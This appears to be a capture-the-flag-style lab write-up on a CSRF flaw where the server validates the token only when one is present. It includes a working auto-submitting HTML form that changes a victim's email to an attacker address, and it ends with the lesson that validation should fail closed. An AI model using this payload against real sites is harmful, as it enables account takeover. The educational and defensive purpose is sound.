# Lab 3: CSRF where token validation depends on token being present

**Difficulty:** Practitioner

## Goal

Change the victim's email with a CSRF attack. The change-email request uses a CSRF token, but the server only validates it when a token is actually submitted.

## Exploit

Omit the `csrf` parameter entirely. With no token present, the server skips validation.

```html
<form action="https://LAB-ID.web-security-academy.net/my-account/change-email" method="POST">
  <input type="hidden" name="email" value="attacker@evil.com" />
</form>
<script>document.forms[0].submit();</script>
```

Store on the exploit server and deliver to the victim.

## Why it works

The token check is conditional: the server validates `csrf` only if the parameter exists. Remove the parameter (not just blank its value) and the validation branch never runs. Confirmed in Repeater by deleting the whole `&csrf=...` and getting a successful response.

## Takeaway

Validation must fail closed. "Check the token if it's there" means an attacker simply never sends one. A missing token should be treated as an invalid token.

## Note on automation

Browser/exploit-server driven. The lab-01 solve.py pattern applies - the PoC just has no csrf field.
